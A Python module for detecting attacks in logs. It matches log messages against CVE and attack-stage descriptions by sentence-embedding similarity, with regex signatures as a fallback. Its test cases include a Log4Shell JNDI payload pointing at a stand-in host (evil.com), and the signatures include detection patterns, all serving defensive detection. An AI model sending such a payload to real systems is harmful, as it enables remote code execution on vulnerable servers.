#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
adalog_semantic_encoder.py
--------------------------------------------------------
Real ADALog-style semantic encoder for log anomaly detection

Uses sentence transformers for semantic similarity between:
- CVE descriptions (attack signatures)
- Log messages (observed behavior)

This replaces the MockADALogEncoder with true semantic learning.
"""

import numpy as np
from typing import Dict, List, Tuple, Optional
from pathlib import Path
import json

try:
    from sentence_transformers import SentenceTransformer
    TRANSFORMERS_AVAILABLE = True
except ImportError:
    print("Warning: sentence-transformers not installed.")
    print("Install with: pip install sentence-transformers")
    TRANSFORMERS_AVAILABLE = False


class ADALogSemanticEncoder:
    """
    Real semantic encoder using sentence transformers.

    Learns to match log messages to CVE descriptions through semantic similarity.
    Can detect attack variants without explicit regex patterns.
    """

    def __init__(self, dim: int = 384, families: List[str] = None, model_name: str = 'all-MiniLM-L6-v2'):
        """
        Initialize semantic encoder

        Args:
            dim: Embedding dimension (384 for all-MiniLM-L6-v2)
            families: List of threat family names
            model_name: Sentence transformer model name
        """
        if not TRANSFORMERS_AVAILABLE:
            raise ImportError("sentence-transformers required. Install with: pip install sentence-transformers")

        self.dim = dim
        self.families = families or [
            "CVE-2024-6387", "CVE-2021-44228", "CVE-2017-0144",
            "CVE-2020-1472", "CVE-2021-26855",
            "reconnaissance", "exploitation", "privilege_escalation",
            "persistence", "lateral_movement", "exfiltration"
        ]

        # Load sentence transformer model
        print(f"Loading semantic model: {model_name}...")
        self.model = SentenceTransformer(model_name)
        print(f"✓ Model loaded (embedding dim: {self.model.get_sentence_embedding_dimension()})")

        # CVE knowledge base: descriptions of what each CVE looks like in logs
        self.cve_descriptions = {
            "CVE-2024-6387": [
                "SSH daemon crashes with SIGALRM signal during authentication",
                "sshd process segmentation fault in signal handler",
                "OpenSSH race condition causing daemon crash",
                "SSH authentication interrupted by alarm signal",
                "sshd core dump during login attempt"
            ],
            "CVE-2021-44228": [
                "JNDI lookup in log messages with ldap or rmi URLs",
                "Java runtime executing commands from JNDI injection",
                "ProcessBuilder executing shell commands from logs",
                "LDAP or RMI connection to external server from Java",
                "Log4j remote code execution through string interpolation"
            ],
            "CVE-2017-0144": [
                "SMB protocol exploitation with NT_STATUS errors",
                "EternalBlue SMB buffer overflow",
                "Remote code execution through SMB v1 vulnerability",
                "psexec remote command execution",
                "File encryption and ransom note creation"
            ],
            "CVE-2020-1472": [
                "Netlogon authentication bypass with zero credentials",
                "Domain controller privilege escalation",
                "Zerologon vulnerability in Windows authentication"
            ],
            "CVE-2021-26855": [
                "Exchange Server SSRF vulnerability exploitation",
                "Autodiscover endpoint abuse",
                "ProxyLogon attack chain"
            ]
        }

        # Attack stage descriptions
        self.stage_descriptions = {
            "reconnaissance": [
                "Network scanning with nmap or similar tools",
                "Port scanning and service enumeration",
                "Vulnerability scanning and probing"
            ],
            "exploitation": [
                "Exploit payload execution",
                "Remote code execution attempt",
                "Shell spawning from vulnerability"
            ],
            "privilege_escalation": [
                "Gaining root or administrator privileges",
                "Privilege escalation to system level",
                "UID 0 obtained by unprivileged process"
            ],
            "persistence": [
                "Installing backdoor or malicious service",
                "Creating scheduled tasks or cron jobs for persistence",
                "Modifying system startup configuration"
            ],
            "lateral_movement": [
                "Moving from compromised host to other systems",
                "Using stolen credentials on internal network",
                "Pivoting through network with compromised account"
            ],
            "exfiltration": [
                "Large data transfer to external IP address",
                "Reverse shell connection to attacker",
                "Suspicious outbound network traffic with data"
            ]
        }

        # Pre-compute embeddings for all descriptions
        self.family_embeddings = {}
        self._build_knowledge_base()

    def _build_knowledge_base(self):
        """Pre-compute embeddings for all CVE and stage descriptions"""
        print("Building semantic knowledge base...")

        all_descriptions = {**self.cve_descriptions, **self.stage_descriptions}

        for family, descriptions in all_descriptions.items():
            if family in self.families:
                # Compute embeddings for all descriptions of this family
                embeddings = self.model.encode(descriptions, show_progress_bar=False)
                # Average embeddings to get family prototype
                self.family_embeddings[family] = np.mean(embeddings, axis=0)

        print(f"✓ Knowledge base ready: {len(self.family_embeddings)} families")

    def embed(self, text: str) -> np.ndarray:
        """
        Generate semantic embedding for log text

        Args:
            text: Log message text

        Returns:
            Embedding vector
        """
        embedding = self.model.encode([text], show_progress_bar=False)[0]
        return embedding.astype(np.float32)

    def classify(self, text: str) -> Tuple[np.ndarray, List[str], Dict, np.ndarray]:
        """
        Classify log text using semantic similarity to CVE descriptions

        Args:
            text: Log message text

        Returns:
            (embedding, families, patterns, probabilities)
        """
        # Get embedding for this log
        emb = self.embed(text)

        # Compute cosine similarity to each family prototype
        probs = np.zeros(len(self.families), dtype=np.float32)
        patterns = {}

        for i, family in enumerate(self.families):
            if family in self.family_embeddings:
                # Cosine similarity
                family_emb = self.family_embeddings[family]
                similarity = np.dot(emb, family_emb) / (
                    np.linalg.norm(emb) * np.linalg.norm(family_emb)
                )

                # Convert similarity [-1, 1] to probability [0, 1]
                # Use sigmoid-like transformation centered at 0.25 for semantic matching
                # (Lower threshold than 0.5 since semantic similarity is more nuanced)
                prob = 1 / (1 + np.exp(-15 * (similarity - 0.25)))
                probs[i] = prob

                # Create pattern if similarity is meaningful (>0.2 cosine similarity)
                if similarity > 0.2:
                    patterns[family] = f"semantic_{family}_sim_{similarity:.3f}"
            else:
                # Family not in knowledge base, use low baseline
                probs[i] = 0.01

        return emb, self.families, patterns, probs

    def add_family(self, family_name: str, example_logs: List[str]):
        """
        Add a new threat family by learning from example logs

        Args:
            family_name: Name of new family
            example_logs: List of example log messages showing this threat
        """
        if family_name not in self.families:
            self.families.append(family_name)

        # Compute embeddings for examples
        embeddings = self.model.encode(example_logs, show_progress_bar=False)
        # Store average as family prototype
        self.family_embeddings[family_name] = np.mean(embeddings, axis=0)

        print(f"✓ Added family '{family_name}' with {len(example_logs)} examples")

    def update_family(self, family_name: str, new_examples: List[str], alpha: float = 0.1):
        """
        Update a family's prototype with new examples (online learning)

        Args:
            family_name: Family to update
            new_examples: New example logs
            alpha: Learning rate (how much to weight new examples)
        """
        if family_name not in self.family_embeddings:
            print(f"Warning: Family '{family_name}' not found, adding as new")
            self.add_family(family_name, new_examples)
            return

        # Compute embeddings for new examples
        new_embeddings = self.model.encode(new_examples, show_progress_bar=False)
        new_prototype = np.mean(new_embeddings, axis=0)

        # Update with exponential moving average
        old_prototype = self.family_embeddings[family_name]
        self.family_embeddings[family_name] = (
            (1 - alpha) * old_prototype + alpha * new_prototype
        )

        print(f"✓ Updated family '{family_name}' with {len(new_examples)} examples")

    def save_knowledge_base(self, path: str):
        """Save learned family embeddings"""
        data = {
            'families': self.families,
            'embeddings': {
                family: emb.tolist()
                for family, emb in self.family_embeddings.items()
            }
        }
        with open(path, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"✓ Knowledge base saved to {path}")

    def load_knowledge_base(self, path: str):
        """Load learned family embeddings"""
        with open(path, 'r') as f:
            data = json.load(f)

        self.families = data['families']
        self.family_embeddings = {
            family: np.array(emb, dtype=np.float32)
            for family, emb in data['embeddings'].items()
        }
        print(f"✓ Knowledge base loaded from {path}")


class HybridEncoder:
    """
    Hybrid encoder combining semantic similarity with signature patterns.

    Uses semantic matching as primary detection method, with regex as fallback
    for high-confidence known patterns.
    """

    def __init__(self, dim: int = 384, families: List[str] = None):
        """Initialize hybrid encoder"""
        self.semantic_encoder = ADALogSemanticEncoder(dim, families)
        self.dim = dim
        self.families = self.semantic_encoder.families

        # High-confidence regex patterns (optional fallback)
        self.signature_boost = {
            "CVE-2024-6387": [r"sshd.*SIGALRM", r"sshd.*segfault"],
            "CVE-2021-44228": [r"\$\{jndi:(ldap|rmi|dns)://"],
            "CVE-2017-0144": [r"NT_STATUS_INSUFF_SERVER_RESOURCES"]
        }

    def embed(self, text: str) -> np.ndarray:
        """Generate embedding"""
        return self.semantic_encoder.embed(text)

    def classify(self, text: str) -> Tuple[np.ndarray, List[str], Dict, np.ndarray]:
        """
        Classify using semantic + signature hybrid approach

        Args:
            text: Log message text

        Returns:
            (embedding, families, patterns, probabilities)
        """
        import re

        # Get semantic classification
        emb, families, patterns, probs = self.semantic_encoder.classify(text)

        # Boost probabilities if high-confidence signatures match
        for i, family in enumerate(families):
            if family in self.signature_boost:
                for pattern in self.signature_boost[family]:
                    if re.search(pattern, text, re.IGNORECASE):
                        # Boost to 0.95 if semantic already detected
                        if probs[i] > 0.5:
                            probs[i] = 0.95
                            patterns[family] = f"hybrid_{family}_semantic+signature"
                        # Set to 0.85 if semantic missed but signature caught
                        else:
                            probs[i] = 0.85
                            patterns[family] = f"signature_{family}_matched"
                        break

        return emb, families, patterns, probs


def test_semantic_encoder():
    """Test semantic encoder on example logs"""
    print("\n" + "="*70)
    print("TESTING SEMANTIC ENCODER")
    print("="*70 + "\n")

    encoder = ADALogSemanticEncoder()

    test_cases = [
        # CVE-2024-6387 examples
        ("sshd[16078]: SIGALRM received during authentication from 45.67.11.242", "CVE-2024-6387"),
        ("kernel: sshd[16078]: segfault at 7fff8badc000", "CVE-2024-6387"),
        ("SSH service crashed during login with alarm signal", "CVE-2024-6387"),

        # CVE-2021-44228 examples
        ("GET /api/search?query=${jndi:ldap://evil.com/Exploit}", "CVE-2021-44228"),
        ("java: Runtime.exec() called from JNDI lookup", "CVE-2021-44228"),
        ("Log4j processing malicious JNDI string", "CVE-2021-44228"),

        # Benign logs
        ("nginx: 192.168.1.1 - GET /index.html HTTP/1.1 200", None),
        ("systemd: Started nginx service", None),
        ("User alice logged in successfully", None),
    ]

    print("Testing semantic similarity detection:\n")

    for text, expected in test_cases:
        emb, families, patterns, probs = encoder.classify(text)

        # Get top detection
        top_idx = np.argmax(probs)
        top_family = families[top_idx]
        top_prob = probs[top_idx]

        # Check if correct
        is_correct = (expected is None and top_prob < 0.5) or (expected == top_family and top_prob > 0.5)
        status = "✓" if is_correct else "✗"

        print(f"{status} Log: {text[:60]}...")
        print(f"   Expected: {expected or 'benign'}")
        print(f"   Detected: {top_family} ({top_prob:.3f})")
        if patterns:
            print(f"   Patterns: {list(patterns.keys())}")
        print()

    print("="*70 + "\n")


if __name__ == "__main__":
    test_semantic_encoder()
